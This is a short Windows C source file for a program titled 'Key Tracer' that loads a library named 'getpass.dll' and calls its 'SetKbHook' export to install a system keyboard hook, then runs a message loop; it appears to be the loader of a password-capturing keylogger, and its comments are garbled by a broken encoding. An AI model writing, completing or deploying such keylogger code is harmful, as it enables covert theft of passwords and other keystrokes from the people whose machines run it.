include "ktr.h"
//win �������
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpszCmdLine, int nCmdShow)
{
    MSG msg;
    char text[] = "Error loading DLL!";
    char title[] = "Key Tracer";
    BOOL error = FALSE;
    HINSTANCE	dllhinst;
    //������װ���Ӻ���ָ�룬������¼dll�а�װ���ӵĵ�ַ
    typedef VOID (CALLBACK * LPFNDLLFUNC1)(VOID);
    LPFNDLLFUNC1 lpfnDllFunc1;
    //���ع���dll
    dllhinst = LoadLibrary("getpass.dll");
    //�ж��Ƿ����dll�ɹ�
    if (dllhinst != NULL)
    {
        lpfnDllFunc1 = (LPFNDLLFUNC1)GetProcAddress(dllhinst, "SetKbHook");
        if (!lpfnDllFunc1)
        {
            FreeLibrary(dllhinst);
            error = TRUE;
        }
        else
        {
            lpfnDllFunc1();
        }
    }
    else error = TRUE;

    if (error)
        MessageBox(GetDesktopWindow(), text, title, MB_OK);

    while (GetMessage(&msg, 0, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    };
    return msg.wParam;
}
